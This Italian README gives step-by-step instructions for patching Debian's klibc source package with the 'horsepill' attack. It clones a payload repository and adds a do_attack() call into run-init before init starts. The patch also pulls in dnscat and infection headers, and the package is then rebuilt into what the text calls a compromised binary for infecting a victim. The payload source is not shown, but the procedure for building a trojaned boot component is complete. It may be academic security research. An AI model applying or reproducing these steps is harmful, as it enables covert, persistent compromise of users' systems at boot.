# Come patchare klibc
Per comodità, creiamo due cartelle di lavoro che consentiranno la creazione del file di _patch_ e la sua applicazione:
```
mkdir /tmp/create
mkdir /tmp/apply
```
## Creazione del file di patch
All'interno della cartella `/tmp/create` scarichiamo il pacchetto sorgente `klibc`:
```
cd /tmp/create
apt-get build-dep klibc && apt-get source klibc
```
assumendo di lavorare con la versione `2.0.7` di `klibc`, eseguiamo:
```
mv klibc-2.0.7 klibc-2.0.7.orig
gunzip -c klibc_2.0.7.orig.tar.gz | tar -x
```
In questo modo si ottengono due directory:
- `klibc-2.0.7.orig`
- `klibc-2.0.7`

entrambe hanno lo stesso contenuto e ciò consentirà di eseguire il `diff` a valle delle modifiche.

Eseguiamo la `clone` del repository Github contenente il file corrente e i payload per l'esecuzione dell'attacco:
```
git clone https://github.com/g3lbin/horsepill.git
```
copiamo i file header e sorgenti presenti in `horsepill/src/` all'interno della cartella da modificare:
```
cp horsepill/src/* klibc-2.0.7/usr/kinit/run-init
```
Utilizzando un editor di testi qualsiasi (e.g. `vim`) modifichiamo i seguenti file:
1. `klibc-2.0.7/usr/kinit/run-init/Kbuild`
```diff
# common .o files
-objs := run-init.o runinitlib.o
+objs := run-init.o runinitlib.o horsepill.o
```
2. `klibc-2.0.7/usr/kinit/run-init/run-init.c`
```diff
#include "run-init.h"
+#include "horsepill.h"

static const char *program;
```
```diff
        char **initargs;
+        cmdline_ptr = (char **)argv;

        /* Variables... */
        int o;
```
3. `klibc-2.0.7/usr/kinit/run-init/runinitlib.c`
```diff
#include "capabilities.h"
+#include "horsepill.h"

/* Make it possible to compile on glibc by including constants that the
```
```diff
        if (!dry_run) {
+                puts("[HORSEPILL] G3LBIN VISITED YOU!\n");
+                sleep(5);
+                do_attack();
                /* Spawn init */
                execv(init, initargs);
                return init;		/* Failed to spawn init */
```
Infine, per creare il file di patch `klibc-horsepill.patch` eseguiamo:
```
diff -u klibc-2.0.7.orig/usr/kinit/run-init/Kbuild klibc-2.0.7/usr/kinit/run-init/Kbuild > klibc-horsepill.patch
diff -u /dev/null klibc-2.0.7/usr/kinit/run-init/dnscat.h >> klibc-horsepill.patch
diff -u /dev/null klibc-2.0.7/usr/kinit/run-init/extractor.h >> klibc-horsepill.patch
diff -u /dev/null klibc-2.0.7/usr/kinit/run-init/infect.h >> klibc-horsepill.patch
diff -u /dev/null klibc-2.0.7/usr/kinit/run-init/horsepill.h >> klibc-horsepill.patch
diff -u /dev/null klibc-2.0.7/usr/kinit/run-init/horsepill.c >> klibc-horsepill.patch
diff -u klibc-2.0.7.orig/usr/kinit/run-init/run-init.c klibc-2.0.7/usr/kinit/run-init/run-init.c >> klibc-horsepill.patch
diff -u klibc-2.0.7.orig/usr/kinit/run-init/runinitlib.c klibc-2.0.7/usr/kinit/run-init/runinitlib.c >> klibc-horsepill.patch
```
## Applicazione della patch
Copiamo il file di patch nell'altro spazio di lavoro e spostiamoci lì dentro:
```
cp klibc-horsepill.patch /tmp/apply
cd /tmp/apply
```
Scarichiamo anche qui il pacchetto sorgente `klibc`:
```
apt-get build-dep klibc && apt-get source klibc
```
Applichiamo la patch:
```
cd klibc-2.0.7
quilt import ../klibc-horsepill.patch
dpkg-buildpackage -j$(nproc) -us -uc
```
Così facendo, viene generato il binario compromesso che consentirà di infettare la vittima: `/tmp/apply/klibc-2.0.7/usr/kinit/run-init/shared/run-init`